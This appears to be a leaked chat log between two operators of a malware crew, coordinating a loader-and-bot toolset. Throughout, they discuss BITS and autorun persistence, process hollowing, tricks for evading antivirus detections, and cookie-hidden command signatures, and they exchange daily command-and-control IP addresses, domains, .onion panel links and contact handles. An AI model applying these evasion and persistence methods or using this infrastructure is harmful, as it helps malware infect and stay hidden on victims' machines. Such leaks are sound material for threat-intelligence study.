+That's the one you pass to the bot.
+
+2020-09-24T14:15:40 frog -> mushroom
+I.e. the one that will be copied into the Temp folder is fixed in the system? Or does the bootloader anchor itself at any startup?
+
+2020-09-24T14:16:47 mushroom -> frog
+Uploader does not fix itself anymore. It fixes the bot. It turns the downloader started downloading and running bot, and that's it.
+
+2020-09-24T14:16:57 mushroom -> frog
+Passed my name to the bot on startup.
+
+2020-09-24T14:17:33 mushroom -> frog
+The bot received command 18 and used the loader file name it knows to fix it.
+
+2020-09-24T14:18:50 mushroom -> frog
+The update works like this, the bot downloaded the bootloader, deleted the old one, started the new one and finished. The new loader will download the bot and start again. And the newly launched bot will know the file name of the new loader.
+
+2020-09-24T14:55:24 frog -> mushroom
+So the update is only run through admin? With the commands "upload loader x64"?
+
+2020-09-24T14:59:13 mushroom -> frog
+When the bootloader starts it gets the version from the admin, if it is different, it downloads, runs it and completes. If the bot gets the Force Update Now command, it downloads the file that's there, deletes the old loader, runs the downloaded file and terminates.
+
+2020-09-24T15:01:30 mushroom -> frog
+If the Force Update Now command does not have a file specified, the bot just starts the old loader and terminates.
+
+2020-09-24T15:01:59 mushroom -> frog
+No need to do all that Upload loader x86 stuff yet.
+
+2020-09-24T15:02:11 mushroom -> frog
+Only Force Update Now.
+
+2020-09-25T12:29:31 mushroom -> frog
+Hi.
+
+2020-09-25T12:29:33 mushroom -> frog
+lowers
+185.90.61.207
+92.242.40.241
+139.60.163.131
+185.242.85.194
+195.123.237.153
+185.142.99.8
+
+bot
+185.164.32.108
+185.244.39.65
+86.104.194.20
+88.150.197.187
+5.9.178.75
+45.138.158.53
+
+2020-09-25T16:38:45 mushroom -> frog
+Hi.
+
+2020-09-25T16:38:45 mushroom -> frog
+lowers
+185.90.61.207
+92.242.40.241
+139.60.163.131
+185.242.85.194
+195.123.237.153
+185.142.99.8
+
+bot
+185.164.32.108
+185.244.39.65
+86.104.194.20
+88.150.197.187
+5.9.178.75
+45.138.158.53
+
+2020-09-28T07:12:29 mushroom -> frog
+Hi.
+
+2020-09-28T07:12:30 mushroom -> frog
+lowers
+62.108.35.194
+134.255.254.50
+23.239.84.136
+46.17.107.111
+185.68.93.33
+212.80.219.191
+
+bot
+23.239.84.132
+194.5.249.126
+51.89.177.5
+104.161.32.103
+107.155.137.7
+37.220.6.119
+
+2020-09-28T08:19:01 mushroom -> frog
+Don't you have any detects on your autotests?
+
+2020-09-28T08:23:12 frog -> mushroom
+Hi. I got Behavior:Win32/DefenseEvasion today. I'm trying to figure out what's causing it. There's something wrong with the masking.
+
+2020-09-28T08:24:20 mushroom -> frog
+On x64?
+
+2020-09-28T08:26:24 frog -> mushroom
+Yes
+
+2020-09-28T08:28:38 mushroom -> frog
+Try disabling ProcessHollowing in the loader and see if it passes the detection.
+
+2020-09-28T08:30:36 mushroom -> frog
+[11:29:35] <mushroom> On dyncheck merge if you check for dynamics?
+[11:29:41] <buza> yes, they can
+[11:29:55] <buza> yes dyncheck can be checked just before it's given into the fight
+[11:30:00] <buza> before that you should use autotests
+
+2020-09-28T08:31:13 mushroom -> frog
+Now check on our autotests for dynamics, not dyncheck.
+
+2020-09-28T08:33:12 frog -> mushroom
+How do you check on autotests?
+
+2020-09-28T08:34:14 frog -> mushroom
+Is that what Bentley does?
+
+2020-09-28T08:34:15 mushroom -> frog
+I'll tell you what I'm going to do. In the meantime, check if the detector goes away or not.
+
+2020-09-28T08:34:28 mushroom -> frog
+No.
+
+2020-09-28T09:54:54 mushroom -> frog
+Do you have an account in cryptoPanel?
+
+2020-09-28T09:56:53 frog -> mushroom
+No
+
+2020-09-28T10:04:22 mushroom -> frog
+Booza made you an account. Go to https://ncdzrppa5xl3vw57lk6x3prcj5p63y3m46t4giq6rvdsa3woed3hicid.onion/crpanel
+
+2020-09-28T10:05:09 mushroom -> frog
+There select your tab if you have, if not, select the tab others, load your loader there.
+
+2020-09-28T10:05:23 mushroom -> frog
+Press the VM button.
+
+2020-09-28T10:05:55 mushroom -> frog
+Select antivirus machines, select AV Only at the bottom and click OK.
+
+2020-09-28T10:06:26 mushroom -> frog
+Here's the manual https://mk6gwg6mwnn6if33.onion/attachments/72
+
+2020-09-28T10:07:49 frog -> mushroom
+What is your username and password?
+
+2020-09-28T10:08:03 frog -> mushroom
+Found
+
+2020-09-28T10:08:45 mushroom -> frog
+Is there a frog tab?
+
+2020-09-28T10:11:44 frog -> mushroom
+Logged in. It says "frog" at the top right.
+
+2020-09-28T10:12:00 mushroom -> frog
+That's where you upload it.
+
+2020-09-30T07:28:29 frog -> mushroom
+Hi. What are the ip addresses today?
+
+2020-09-30T07:43:21 mushroom -> frog
+These are the same. Just make sure everything is working properly.
+
+2020-09-30T07:43:47 mushroom -> frog
+Check that the queries work for them.
+
+2020-09-30T08:55:15 mushroom -> frog
+Make the loader also to be primitive, only downloads and launches without saving to disk bot.
+
+2020-09-30T08:59:45 mushroom -> frog
+You have DefenseIvasion Bentley said. It's definitely not a string obfuscator or api obfuscator. I've done the loader with and without other obfuscators altogether and the detection is there. I think it's process hollowing.
+
+2020-09-30T10:13:47 mushroom -> frog
+I have a guess here about DefenseIvasion\Wacatac. Go into project properties, general, target object name, and change the current name to something else. I've done it myself, haven't caught any more of these detects yet.
+
+2020-09-30T10:14:29 mushroom -> frog
+You also need to build a kit for group 4 regular, and for group 7 with a primitive loader, as I wrote above.
+
+2020-09-30T10:17:40 frog -> mushroom
+Sent Bentley a few sets of band 7 today
+
+2020-09-30T10:20:00 mushroom -> frog
+No detects?
+
+2020-09-30T10:22:51 frog -> mushroom
+Checked it myself. No detects.
+
+2020-09-30T10:23:09 mushroom -> frog
+For group 4, do another one.
+
+2020-09-30T10:25:23 frog -> mushroom
+I had DefenseIvasion occur when I called VirtualAllocEx in the cloaking module.
+
+2020-09-30T10:27:29 mushroom -> frog
+It wasn't obfuscated?
+
+2020-09-30T10:29:13 frog -> mushroom
+Everything has been obfuscated. It seems to be a dynamic detection. I only had it on the second startup, after rebooting the OS, or on restarting it.
+
+2020-09-30T10:33:44 frog -> mushroom
+For group 4, what are the addresses?
+I would like to wait for the results of testing, because the functionality has changed significantly, moved the fixing in the system.
+
+2020-09-30T10:34:04 frog -> mushroom
+Addresses to download bot and loader, I mean
+
+2020-09-30T10:34:05 mushroom -> frog
+Same addresses.
+
+2020-09-30T10:34:45 frog -> mushroom
+These are: /api/v153
+
+2020-09-30T10:34:59 mushroom -> frog
+And these. I'll tell you in a moment.
+
+2020-09-30T10:46:20 mushroom -> frog
+Loader x86 /api/v97, Loader x64 x86 /api/v98, Bot x86 /api/v99, Bot x64 /api/v100
+
+2020-09-30T10:46:52 mushroom -> frog
+Loader x86 /api/v97, Loader x64 /api/v98, Bot x86 /api/v99, Bot x64 /api/v100
+
+2020-10-01T09:52:29 frog -> mushroom
+Hi. Bentley tested a few kits yesterday. 3 out of 4 are working fine, but fixing in the system in Windows 7 something didn't work. Asked him to let it run on a virtual machine. I tested it on Windows 7 at home though, it works fine
+
+2020-10-01T10:18:35 mushroom -> frog
+Got it. What's the fixation there?
+
+2020-10-01T10:18:43 mushroom -> frog
+Not BITS by any chance?
+
+2020-10-01T11:09:08 frog -> mushroom
+Both BITS and autoloading are there.
+
+2020-10-01T11:09:59 mushroom -> frog
+BITS it's always like this on Win 7. If bitsadmin sees your task and the file exists, it will run after a while.
+
+2020-10-01T11:10:19 mushroom -> frog
+It took my bootloader about 2 hours to start after he rebooted.
+
+2020-10-01T11:10:43 mushroom -> frog
+BITS doesn't start right away after a reboot.
+
+2020-10-01T11:13:39 mushroom -> frog
+And don't forget if BITS then the program should always return 1, so that BITS will always restart it.
+
+2020-10-01T11:16:34 frog -> mushroom
+Yes, that's taken into account. I don't return zero, but 1, - 1, etc. (not zero in general). Works fine. Does it have to be one?
+
+2020-10-01T11:19:57 mushroom -> frog
+Your program should return an exit code of zero. If your program does not return an exit code of zero, BITS checks the state of the job. If the program did not cancel or complete the job, BITS calls the program again after the minimum retry delay specified for the job expires.
+
+2020-10-01T11:20:04 mushroom -> frog
+https://docs.microsoft.com/en-us/windows/win32/api/bits1_5/nf-bits1_5-ibackgroundcopyjob2-setnotifycmdline
+
+2020-10-01T11:20:15 mushroom -> frog
+Here's the description, as long as it's not 0.
+
+2020-10-01T11:20:32 mushroom -> frog
+Otherwise it will run once and that's it.
+
+2020-10-02T08:15:09 frog -> mushroom
+Hi. Have the addresses changed today?
+
+2020-10-02T08:20:38 mushroom -> frog
+No.
+
+2020-10-06T07:56:40 frog -> mushroom
+Hi. What are the IP addresses today?
+
+2020-10-06T08:11:20 mushroom -> frog
+I'll find out for now.
+
+2020-10-06T08:43:57 mushroom -> frog
+bot
+
+54.236.253.121 z55gc.com
+54.201.135.91 z56gc.com
+
+Lowder
+
+
+34.230.74.154 z57gc.com
+3.135.193.147 z58gc.com
+54.190.173.144 z59gc.com
+
+2020-10-06T08:45:24 mushroom -> frog
+Gather group 4 and 7.
+
+2020-10-06T08:45:53 frog -> mushroom
+Is z55gc.com a separate address?
+
+2020-10-06T08:46:01 mushroom -> frog
+Same thing.
+
+2020-10-06T08:46:14 mushroom -> frog
+Whatever you're most comfortable with.
+
+2020-10-06T08:47:14 mushroom -> frog
+What groups are you doing?
+
+2020-10-06T08:47:28 mushroom -> frog
+7 и 41?
+
+2020-10-06T08:47:29 frog -> mushroom
+7
+
+2020-10-06T08:47:42 frog -> mushroom
+Only 7
+
+2020-10-06T08:47:45 mushroom -> frog
+<ajrec> frog, group 41
+
+2020-10-06T08:47:54 mushroom -> frog
+Didn't do it?
+
+2020-10-06T08:48:40 frog -> mushroom
+No, only did 7 and 7. Only these were commissioned to do
+
+2020-10-06T08:48:55 mushroom -> frog
+А 4?
+
+2020-10-06T08:49:08 mushroom -> frog
+Remember I told you to make 4?
+
+2020-10-06T08:50:35 frog -> mushroom
+Yes. I was going to do it last week, but the tests did not pass Group 7 kits, so I was looking into the reasons
+
+2020-10-06T08:50:53 mushroom -> frog
+It's all sorted out. 41 is not yours.
+
+2020-10-06T08:51:10 mushroom -> frog
+Do 4 and 7. And turn in a Bentley.
+
+2020-10-06T08:51:22 frog -> mushroom
+Okay
+
+2020-10-07T07:19:52 frog -> mushroom
+Hi. What are the IP addresses today?
+
+2020-10-07T07:44:01 mushroom -> frog
+Hi.
+
+2020-10-07T07:44:03 mushroom -> frog
+bot
+
+52.12.203.202 x55gc.com
+54.162.201.128 x56gc.com
+
+Lowder
+
+13.58.213.252 x57gc.com
+3.81.126.82 x58gc.com
+54.213.49.29 x59gc.com
+
+2020-10-08T07:54:21 mushroom -> frog
+Hi.
+
+2020-10-08T07:54:22 mushroom -> frog
+bot
+
+3.235.164.215 ds43x1.com
+18.224.51.180 ds44x1.com
+
+
+Lowder
+
+
+18.207.182.253 ds45x1.com
+35.160.125.254 ds46x1.com
+3.238.77.5 ds47x1.com
+
+2020-10-08T07:55:39 frog -> mushroom
+Hi
+
+2020-10-08T08:07:54 mushroom -> frog
+Here's a refinement for both the loider and the bot. We need to make all received cookies to be checked as a signature.
+
+2020-10-08T08:08:32 mushroom -> frog
+Now a lot of cookies will come from the server, the signature will be hidden among them.
+
+2020-10-08T08:09:22 mushroom -> frog
+Comes in like this:
+Set-Cookie: ohf29h1f[80h
+Set-Cookie: 96302986013-08
+Set-Cookie: m\poj\ojmf2j]09§h=8§y-97§fgfb§91fbp8b
+Set-Cookie: h'oih'oin'oivno'vhohp98h0j[pkarnv;bka\pgj'p
+Set-Cookie: nm;kn'pRH'IHJGR'onvLM'Pvj'oivwehe[8h03ghjf]0h]0fn
+
+2020-10-08T08:10:53 mushroom -> frog
+Run them all as a signature for the date, before the date is checked, no one fits, then the signature is not checked.
+
+2020-10-08T08:11:46 mushroom -> frog
+The Groups tab in the admin area now has a Cookies Names field
+
+2020-10-08T08:12:37 mushroom -> frog
+There write names for cookies (only names). At least 5 of them, separator is a new line.
+
+2020-10-08T08:13:01 frog -> mushroom
+Okay
+
+2020-10-12T14:45:14 frog -> mushroom
+Hi. What are the IP addresses today?
+
+2020-10-12T15:00:27 mushroom -> frog
+bot
+
+54.144.104.189 sawssale.com
+3.22.250.104 dustsinc.com
+
+loader
+
+34.220.8.194 justsinc.com
+18.212.74.215 onlinewells.com
+3.128.197.68 funqwik.com
+
+2020-10-12T15:50:21 mushroom -> frog
+Did you make sure all cookies are checked as a signature by the way? If you did, write in Groups tab, in Cookies Names field, names for cookies, in which will be hidden signature. At least 5, separated by a new line. In all of your groups do so.
+
+2020-10-14T11:27:26 frog -> mushroom
+Hi. What are the IP addresses today?
+I can't seem to get on redmine. Did the address change there?
+
+2020-10-14T11:28:34 mushroom -> frog
+I can't get in either.
+
+2020-10-14T11:28:45 mushroom -> frog
+bot
+
+18.188.194.80 labelcs.com
+54.91.36.142 freedubcs.com
+
+loader
+
+54.245.74.151 titlecs.com
+54.145.79.240 mixcinc.com
+3.138.117.231 nicknamec.com
+
+2020-10-15T08:08:02 frog -> mushroom
+Hi. Have the IP addresses changed today?
+
+2020-10-15T08:26:41 mushroom -> frog
+Yesterday's addresses don't work. Use the old ones:
+bot
+
+3.137.180.197 cuprinc.com
+3.238.75.236 shophoof.com
+
+loader
+
+34.221.202.231 breezdesign.com
+54.83.253.135 hotenlighten.com
+18.191.38.26 onebulks.com
+
+2020-10-15T08:26:56 mushroom -> frog
+Check which ones work and use them.
+
+2020-10-15T08:27:14 mushroom -> frog
+34.221.202.231 breezdesign.com this one doesn't seem to work.
+
+2020-10-15T15:26:42 frog -> mushroom
+No new IP addresses for today?
+
+2020-10-15T15:27:29 mushroom -> frog
+bot
+
+18.188.194.80 labelcs.com
+54.91.36.142 freedubcs.com
+
+loader
+
+54.245.74.151 titlecs.com
+54.145.79.240 mixcinc.com
+3.138.117.231 nicknamec.com
+
+2020-10-15T15:27:49 mushroom -> frog
+These I gave, I don't remember.
+
+2020-10-15T15:28:22 mushroom -> frog
+These work.
+
+2020-10-15T15:28:38 frog -> mushroom
+Okay, thank you.
+
+2020-10-16T10:06:44 mushroom -> frog
+Hi. Now you have a supervisor kaktus@q3mcco35auwcstmt.onion
+
+2020-10-16T10:07:03 mushroom -> frog
+Write to him.
+
+2020-11-02T14:15:55 mushroom -> frog
+Hi. Do you have a backup account for communication?
+
+2020-11-02T14:16:28 frog -> mushroom
+Hi!
+crazy_digger@jabber.ru
+
+2020-11-02T14:17:13 mushroom -> frog
+Passed.
+
